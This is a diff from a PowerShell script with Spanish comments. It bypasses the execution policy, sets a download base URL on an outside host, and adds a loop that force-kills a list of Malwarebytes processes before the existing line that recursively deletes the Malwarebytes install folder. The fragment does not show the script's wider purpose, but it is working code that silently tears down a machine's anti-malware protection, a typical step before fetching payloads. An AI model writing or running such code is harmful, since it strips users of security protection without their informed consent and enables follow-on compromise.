@@ -15,6 +15,18 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 # URL base para descargas
 $baseURL = "https://baa4ts.is-a-good.dev"
 
+# Lista de nombres de procesos de Malwarebytes
+$mbProcesses = @(
+    "assistant", "ig", "Malwarebytes", "malwarebytes_assistant",
+    "mb5uns", "MBAM", "MbamBgNativeMsg", "MBAMCrashHandler",
+    "MBAMInstallerService", "MbamPt", "MBAMService", "MBAMWsc",
+    "mbuns", "mbupdatrV5", "MBVpnTunnelService", "createdump"
+)
+
+foreach ($procName in $mbProcesses) {
+    Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force
+}
+
 Remove-Item -Path "C:\Program Files\Malwarebytes" -Recurse -Force -Confirm:$false
 
 # Definir rutas
